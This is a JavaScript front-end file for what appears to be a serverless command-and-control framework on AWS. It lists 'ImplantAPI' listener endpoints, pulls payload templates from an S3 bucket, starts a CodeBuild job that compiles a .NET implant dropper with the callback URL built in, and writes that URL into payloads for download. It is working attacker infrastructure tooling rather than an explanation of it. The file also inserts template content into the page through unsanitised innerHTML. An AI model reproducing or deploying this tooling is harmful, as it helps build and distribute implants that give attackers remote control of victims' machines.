var s3 = new AWS.S3({ signatureVersion: 'v4' });
var apigateway = new AWS.APIGateway();
var codebuild = new AWS.CodeBuild({ signatureVersion: 'v4' });


//view APIs
function listListeners() {
    var params = {
    };
    apigateway.getRestApis(params, function(err, data) {
        if (err) console.log(err, err.stack); // an error occurred
        else {
            for (var a in data.items) {
                if (data.items[a].name == 'ImplantAPI-' + _config.DeploymentID ) {
                    listURLs(data.items[a].id);
                }
            }
        }
    });
}

//view stages
function listURLs(ID) {
    console.log(ID);
    var params = {
        restApiId: ID
    };
    apigateway.getStages(params, function(err, data) {
        if (err) console.log(err, err.stack); // an error occurred
        else {
            for (var a in data.item) {
                populateListeners(ID, data.item[a].stageName);
            }
        }
    });
}

function populateListeners(api, subname) {
    url = 'https://' + api + '.execute-api.' + _config.cognito.region + '.amazonaws.com/' + subname + '/'
    console.log(url);
    var listener = document.getElementById("selectedListener");
    var option = document.createElement('option')
    option.innerHTML = url;
    listener.appendChild(option);
    //Populate compile listener last as well
    var compilelistener = document.getElementById("compileListener");
    var option = document.createElement('option')
    option.innerHTML = url;
    compilelistener.appendChild(option);
}

//list objects in bucket
function listObjects() {
    var params = {
        Bucket: "serverless-c2-payloads-" + _config.DeploymentID, 
    };
    s3.listObjectsV2(params, function(err, data) {
        if (err) console.log(err, err.stack); // an error occurred
        else     populateOptions(data); // successful response
    });
}

function populateOptions(data) {
    console.log(data.Contents);
    var filename = document.getElementById("selectedPayload");
    filename.replaceChildren();
    for (var result in data.Contents) {
        if (data.Contents[result].Key.endsWith('.zip')) {
            continue
        }
        var option = document.createElement('option')
        option.innerHTML = data.Contents[result].Key;
        filename.appendChild(option);
    }
}


//compile function
function compileDropper(action) {
    var listener = document.getElementById("compileListener").value;
    var listener_id = listener.split('/')[1].split('.')[0]
    var params = {
        projectName: 'DotnetImplantBuilder-' + _config.DeploymentID,
        environmentVariablesOverride: [
            {
              name: 'LISTENER_URL', /* required */
              value: listener, /* required */
            },
        ],
    };
    codebuild.startBuild(params, function(err, data) {
        if (err) {
            console.log(err, err.stack); alert(err); // an error occurred
        }
        else {
            console.log(data); alert("Build Started (this could take up to 5 minutes)");        // successful response
        }
    });
}

//get object
function getObject(action) {
    var filename = document.getElementById("selectedPayload").value;
    var listener = document.getElementById("selectedListener").value;
    var params = {
        Bucket: "serverless-c2-payloads-" + _config.DeploymentID, 
        Key: filename
    };
    s3.getObject(params, function(err, data) {
        if (err) console.log(err, err.stack); // an error occurred
        else {
            var dataBody = String(data.Body);
            if (!filename.endsWith('.exe')) {
                var edited = dataBody.replace('AWS_URL_LISTENER_HERE',listener)
            }
            else {
                var edited = s3.getSignedUrl('getObject', params);
            }

            if (action === "download") {
                download(filename, edited);
            }
            else {
                displayCode(edited);
            }
        }
    });
}

//place payload contents into the page
function displayCode(data) {
    var payloadHTML = document.getElementById('dropper');
    //this will need to be sanitized OR only allow admins to upload templates
    payloadHTML.innerHTML = data
    hljs.highlightAll();
}


function download(filename, text) {
    var element = document.createElement('a');
    if (filename.endsWith('.exe')) {
        element.setAttribute('href', text);
    }
    else {
        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
    }
    element.setAttribute('download', filename);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

function toggleCompiled() {
    if (toggleClicked.checked) {
        document.getElementById("compileDropper").style.display = "block"
        document.getElementById("loadPayload").style.display = "none"
        listObjects();
    }
    else {
        document.getElementById("compileDropper").style.display = "none"
        document.getElementById("loadPayload").style.display = "block"
        listObjects();
    }
}


//Main Functions

const compileDropperHTML = document.getElementById('compileDropper');
compileDropperHTML.onclick = function(){compileDropper()};

const selectPayloadHTML = document.getElementById('loadPayload');
selectPayloadHTML.onclick = function(){getObject()};

const downloadPayloadHTML = document.getElementById('downloadPayload');
downloadPayloadHTML.onclick = function(){getObject('download')};


//populate select payload dropdown
listObjects();

listListeners();
